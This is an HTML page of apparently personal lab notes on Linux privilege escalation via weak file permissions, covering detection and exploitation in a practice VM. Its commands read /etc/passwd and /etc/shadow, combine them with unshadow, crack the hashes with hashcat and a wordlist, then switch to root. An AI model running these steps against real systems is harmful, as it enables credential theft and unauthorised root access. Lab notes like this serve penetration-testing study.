<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<title>Weak File Permissions</title>
</head><body>Escalation via weak file permissions<br/>
<br/>
looking for access to files we should R-W-X. This is when permission to file can be consdiered excessive<br/>
<br/>
<b>ls -la /etc/shadow</b> <br/>
<br/>
etc/shadow + etc/pass<br/>
<br/>
<b>cat /etc/passwd</b> <br/>
<br/>
<b>cat /etc/shadow</b><br/>
<br/>
extract the data. copy to files<br/>
<br/>
ie; passwd.txt &amp; shadow.txt<br/>
<br/>
unshadow<br/>
<br/>
<b>unshadow &lt;PASSWORD-FILE&gt; &lt;SHADOW-FILE&gt; &gt; unshadowed.txt</b> <br/>
<br/>
john the ripper or hashcat<br/>
<br/>
hashcat requires knowing the hash type. use google..<br/>
<br/>
<br/>
<br/>
<b>hashcat -m 1800 unshadowed.txt rockyou.txt -O</b> <br/>
<br/>
bam passwords<br/>
then <b>su</b><br/>
<br/>
if we ahave the ability to modify the shadow file, just cahnge yourself to root, user 0<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
Detection<br/>
<br/>
Linux VM<br/>
<br/>
1. In command prompt type:<br/>
ls -la /etc/shadow<br/>
2. Note the file permissions<br/>
<br/>
Exploitation<br/>
<br/>
Linux VM<br/>
<br/>
1. In command prompt type: cat /etc/passwd<br/>
2. Save the output to a file on your attacker machine<br/>
3. In command prompt type: cat /etc/shadow<br/>
4. Save the output to a file on your attacker machine<br/>
<br/>
Attacker VM<br/>
<br/>
1. In command prompt type: unshadow &lt;PASSWORD-FILE&gt; &lt;SHADOW-FILE&gt; &gt; unshadowed.txt<br/>
<br/>
Now, you have an unshadowed file. We already know the password, but you can use your favorite hash cracking tool to crack dem hashes. For example:<br/>
<br/>
hashcat -m 1800 unshadowed.txt rockyou.txt -O<br/>
</body></html>